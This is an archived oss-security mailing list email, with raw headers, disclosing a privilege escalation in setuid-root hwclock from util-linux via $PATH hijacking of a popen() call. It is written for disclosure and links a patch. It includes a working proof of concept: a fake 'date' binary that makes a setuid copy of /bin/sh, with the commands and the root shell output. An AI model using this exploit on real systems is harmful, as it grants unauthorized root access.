X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3915" "Tuesday" "26" "May" "2015" "12:47:47" "+0200" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20150526124747.16414nohrczpwps0@webmail.alunos.dcc.fc.up.pt>" "126" "[oss-security] hwclock(8) SUID privilege escalation" nil nil nil "5" "2015052610:47:47" "[oss-security] hwclock(8) SUID privilege escalation" (number mark "        up201407890@ May 26  126/3915  " thread-indent "\"[oss-security] hwclock(8) SUID privilege escalation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 26146 invoked by uid 550); 26 May 2015 13:09:44 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 24085 invoked from network); 26 May 2015 10:48:03 -0000
Message-ID: <20150526124747.16414nohrczpwps0@webmail.alunos.dcc.fc.up.pt>
MIME-Version: 1.0
Content-Type: text/plain;
	charset=ISO-8859-1;
	DelSp="Yes";
	format="flowed"
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable
User-Agent: Internet Messaging Program (IMP) H3 (4.2)
X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
Date: Tue, 26 May 2015 12:47:47 +0200
From: up201407890@alunos.dcc.fc.up.pt
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] hwclock(8) SUID privilege escalation
To: oss-security@lists.openwall.com

Hello,

During a recent assessment I have stumbled across a system which had
hwclock(8) setuid root

hwclock is a part of util-linux, all versions affected

$ man hwclock | sed -n '223,231p'

Users access and setuid
        Sometimes, you need to install hwclock setuid root. If you
want users other than the superuser to be able to display the clock
value using the direct ISA I/O
        method,  install  it setuid root. If you have the /dev/rtc
interface on your system or are on a non-ISA system, there's probably
no need for users to use the
        direct ISA I/O method, so don't bother.

        In any case, hwclock will not allow you to set anything unless
you have the superuser real uid.  (This  is  restriction  is  not
necessary  if  you  haven't
        installed setuid root, but it's there for now).

http://sources.debian.net/src/util-linux/2.26.2-5/sys-utils/hwclock.c/#L2041

"The program is designed to run setuid superuser, since we need to be able
  to do direct I/O. (More to the point: we need permission to execute the
  iopl() system call). (However, if you use one of the methods other than
  direct ISA I/O to access the clock, no setuid is required)."

http://sources.debian.net/src/util-linux/2.26.2-5/sys-utils/hwclock.c/#L1920

"program is designed to run setuid (in some situations)"


Some comments in code and unfortunately also man page
advertising that setuid is no problem. That's pretty stupid promise.


from util-linux/2.26.2-5/sys-utils/hwclock.c
http://sources.debian.net/src/util-linux/2.26.2-5/sys-utils/hwclock.c/#L748


/* Quotes in date_opt would ruin the date command we construct. */
         if (strchr(date_opt, '"') !=3D NULL) {
                 warnx(_
                       ("The value of the --date option is not a valid date=
.\n"
                        "In particular, it contains quotation marks."));
                 return 12;
         }

         sprintf(date_command, "date --date=3D\"%s\" +seconds-into-epoch=3D=
%%s",
                 date_opt);
				[...]

	date_child_fp =3D popen(date_command, "r");

				[...]

hwclock uses popen() to date_command which is 'date --date=3D\"%s\"
+seconds-into-epoch=3D%%s'

Exploiting is trivial, since $PATH is user-controlled



$ ls -l /usr/sbin/hwclock
-rwsr-sr-x. 1 root root 48096 Nov 27 14:10 /usr/sbin/hwclock
$ cat > date.c;gcc date.c -o date
main()
{
chown("/tmp/sploit", 0, 0);
chmod("/tmp/sploit", 04755);
}
^D
$ cp /bin/sh /tmp/sploit
$ PATH=3D".:$PATH" /usr/sbin/hwclock --set --date=3D"05/23/2015 20:35:37"
hwclock: The date command issued by hwclock returned unexpected results.
The command was:
   date --date=3D"05/23/2015 20:35:37" +seconds-into-epoch=3D%s
The response was:

hwclock: No usable set-to time.  Cannot set clock.
$ /tmp/sploit
# id
euid=3D0(root) groups=3D0(root)


Can a CVE be assigned?


Notes:

Please note that this is possible on Debian-derived (and therefore Ubuntu),
because /bin/sh is provided by dash which does NOT make use
of privmode (does not drop privileges if ruid !=3D euid, unlike bash),
which is a very stupid idea.

privmode is surprisingly effective at mitigating some common vulnerability
classes and misconfigurations, and it has been around since mid 90's.
Indeed, Chet Ramey (bash author and maintainer) explains that the
purpose of this is to prevent "bogus system(3)/popen(3) calls in
setuid executables"


TL;DR: When setuid root, hwclock relies on $PATH to popen() the date
command, meaning privilege escalation can occur since $PATH is
user-controlled.


Patches are available, signed off by Karel Zak <kzak@redhat.com>
https://github.com/karelzak/util-linux/commit/687cc5d58942b24a9f4013c68876d=
8cbea907ab1

Initial bug report:
https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=3D786804


Thanks,
Federico Bento.

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

